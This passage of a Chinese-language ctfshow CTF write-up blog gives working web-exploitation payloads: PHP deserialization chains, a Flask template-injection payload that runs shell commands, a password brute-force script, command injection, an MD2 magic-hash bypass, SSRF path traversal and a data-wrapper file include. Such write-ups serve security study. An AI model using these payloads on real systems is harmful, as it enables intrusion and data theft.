+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#用于check.php</span><br><span class="line"></span><br><span class="line">key：qwertyuiopasdfghjklzxcvbnm123456789</span><br><span class="line"></span><br><span class="line">move：2~4</span><br></pre></td></tr></table></figure>
+
+<p>也可以用此法读取check.php</p>
+<p>或者利用filie_getcontent 读取check.php,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;s:1:&quot; &quot;;s:3:&quot;key&quot;;R:2;s:4:&quot;file&quot;;s:11:&quot;./check.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cipher</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$shifted</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> - <span class="variable">$shift</span> + <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>)) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$shifted</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$shifted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decipher</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$charset</span> = <span class="string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;</span><br><span class="line">    <span class="variable">$shift</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$original</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$charset</span>, <span class="variable">$char</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$new_pos</span> = (<span class="variable">$pos</span> + <span class="variable">$shift</span>) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$charset</span>);</span><br><span class="line">            <span class="variable">$original</span> .= <span class="variable">$charset</span>[<span class="variable">$new_pos</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$original</span> .= <span class="variable">$char</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$original</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decipher</span>(<span class="string">&quot;p8vfuv8g8v8py&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最终payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;text = <span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;text -&gt;coos = <span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;text -&gt;coos -&gt;aaa = <span class="keyword">new</span> <span class="title function_ invoke__">cycycycy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>?get&#x3D;fe1ka1ele1efp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:3:&quot;xxx&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h2><p>查看原码发现app.zip 访问下载，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template_string,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hello/&#x27;)</span><br><span class="line">def hello(name=None):</span><br><span class="line">    return render_template(&#x27;hello.html&#x27;,name=name)</span><br><span class="line">@app.route(&#x27;/hello/&lt;name&gt;&#x27;)</span><br><span class="line">def hellodear(name):</span><br><span class="line">    if &quot;ge&quot; in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    elif &quot;f&quot; not in name:</span><br><span class="line">        return render_template_string(&#x27;hello %s&#x27; % name)</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Nonononon&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>hello&#x2F;目录下进行模板注入，注入字符含有‘ge’或者没有f</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hello/&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[83].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo Y2F0IC9mbGFn |base64 -d|sh&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><h2 id><a href="#" class="headerlink" title></a></h2><h1 id="月饼杯"><a href="#月饼杯" class="headerlink" title="月饼杯"></a>月饼杯</h1><h2 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h2><p>下载附件如下    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">	public $uname;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($uname,$password)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;uname=$uname;</span><br><span class="line">		$this-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __wakeup()</span><br><span class="line">	&#123;</span><br><span class="line">			if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">			&#123;</span><br><span class="line">				include(&#x27;flag.php&#x27;);</span><br><span class="line">				echo $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				echo &#x27;wrong password&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>字符串增多逃逸，测试如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password=&#x27;123&#x27;;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;wrong password&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=&#x27;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;;</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">echo $ser.&quot;\n&quot;;</span><br><span class="line">var_dump(unserialize($ser));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h2><p>看提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话大部分字符都被过滤了，但是_(下划线)没有，添加N个 _ (下划线）可以知道密码长度为32</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">like 模糊匹配</span><br><span class="line"></span><br><span class="line">% 表示零个或多个字符的任意字符串</span><br><span class="line">_（下划线）表示任何单个字符</span><br><span class="line">[ ] 表示指定范围 ([a-f]) 或集合 ([abcdef]) 中的任何单个字符</span><br><span class="line">[^] 不属于指定范围 ([a-f]) 或集合 ([abcdef]) 的任何单个字符</span><br><span class="line">* 它同于DOS命令中的通配符，代表多个字符</span><br><span class="line">？同于DOS命令中的？通配符，代表单个字符</span><br><span class="line"># 大致同上，不同的是代只能代表单个数字</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://95d50cc2-b9e1-475d-bb11-57d5b689f34a.challenge.ctf.show/login.php&quot;</span><br><span class="line"></span><br><span class="line">password=&quot;&quot;</span><br><span class="line">length=32</span><br><span class="line">result=&quot;67815b0c009ee970fe4014abaa3Fa6A0&quot;</span><br><span class="line">for i in range(0,33):</span><br><span class="line">    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;:</span><br><span class="line">        payload=password+j+&quot;_&quot;*(31 - len(password))</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;username&quot;:&quot;yu22x&quot;,</span><br><span class="line">            &quot;password&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        if &quot;wrong&quot; not in r:</span><br><span class="line">            print(payload)</span><br><span class="line">            password+=j</span><br><span class="line">          #  print(password)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>fuzz了一下可以使用的字符有<code>大写字母，数字，&#123; &#125;，空格，$，~</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>截取变量$PATH 从左向右第六个字符的一个</p>
+<p><img src="/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/QQ%E6%88%AA%E5%9B%BE20230528192948.png"></p>
+<p>[(12条消息) linux 中${ }截取变量字符串_沉浸致远的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44244371/article/details/103539800#:~:text=linux">https://blog.csdn.net/weixin_44244371/article/details/103539800#:~:text=linux</a> 中%24 { }截取变量字符串 1 %23号截取，删除左边字符，保留右边字符。 代码如下%3A echo,从左边第几个字符开始，一直到结束。 … 7 从右边第几个字符开始，及字符的个数。 … 8 从右边第几个字符开始，一直到结束。 )</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;$&#123;PATH::1&#125;???$&#123;PATH::1&#125;????64 ????.???</span><br></pre></td></tr></table></figure>
+
+<h2 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">$url[1]=$_POST[&#x27;url&#x27;];</span><br><span class="line">if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</span><br><span class="line">    $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</span><br><span class="line">    if($d)&#123;</span><br><span class="line">             highlight_file(&#x27;hint.php&#x27;);</span><br><span class="line">             if(filter_var($url[1],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[1]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                if(preg_match(&#x27;/ctfshow\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[1]));</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &#x27;差点点就成功了！&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &#x27;please give me url!!!&#x27;;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;想一想md5碰撞原理吧?!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;第一个都过不了还想要flag呀?!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>php小数点超过161位做平方运算时会被截断，我们可以用科学计数法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=100;$i&lt;999;$i++)&#123;</span><br><span class="line">    $b = &quot;0e&quot;.$i.&quot;024452&quot;;</span><br><span class="line">    if($b==hash(&quot;md2&quot;, $b))&#123;</span><br><span class="line">        echo $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">for ($i=1000;$i&lt;9999;$i++)&#123;</span><br><span class="line">    $c = &quot;0e&quot;.$i.&quot;48399&quot;;</span><br><span class="line">    if($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)))&#123;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1e-162&amp;b=0e652024452&amp;c=0e603448399</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents使用不存在的协议名导致目录穿越，实现SSRF</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=hhh://ctfshow.com/../../../../../fl0g.txt</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13747354.html">ctfshow 月饼杯 Web writeup - NPFS - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113274503">(12条消息) CTFSHOW 月饼杯 web_ctfshow web3_莫负婵娟_bfengj的博客-CSDN博客</a></p>
+<h1 id="36D练手赛"><a href="#36D练手赛" class="headerlink" title="36D练手赛"></a>36D练手赛</h1><h2 id="不知所措-jpg"><a href="#不知所措-jpg" class="headerlink" title="不知所措.jpg"></a>不知所措.jpg</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test/../index.</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$file=$file.&#x27;php&#x27;;</span><br><span class="line">echo $file.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">if(preg_match(&#x27;/test/is&#x27;,$file))</span><br><span class="line">&#123;	include ($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;$file must has test&#x27;;</span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php%20system(%27cat%20/F*%27);?&gt;test</span><br></pre></td></tr></table></figure>
+
+<h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><h1 id="萌新赛"><a href="#萌新赛" class="headerlink" title="萌新赛"></a>萌新赛</h1><h2 id="给她"><a href="#给她" class="headerlink" title="给她"></a>给她</h2><p>git泄露，githack下载源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
